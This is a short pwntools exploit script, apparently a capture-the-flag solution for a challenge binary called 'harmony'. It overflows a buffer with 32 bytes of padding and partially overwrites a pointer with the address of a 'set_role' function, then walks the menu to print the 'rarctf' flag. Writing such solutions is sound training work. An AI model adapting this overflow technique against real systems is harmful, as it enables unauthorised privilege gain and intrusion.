#!/usr/bin/python3

from pwn import *
import re

e = ELF("./src/harmony")
if args.REMOTE:
    p = remote(args.HOST, int(args.PORT))
else:
    p = process(e.path)

p.recv(timeout=1)
p.sendline(b"3")
p.recvuntil(b": ")
pl = b"A"*32 + p64(e.sym["set_role"])[:3]
p.sendline(pl)
p.sendline(b"3")
p.sendline(b"0")
p.sendline(b"2")
text = p.clean(timeout=1).decode()
log.success(re.search("rarctf{.*}", text).group())
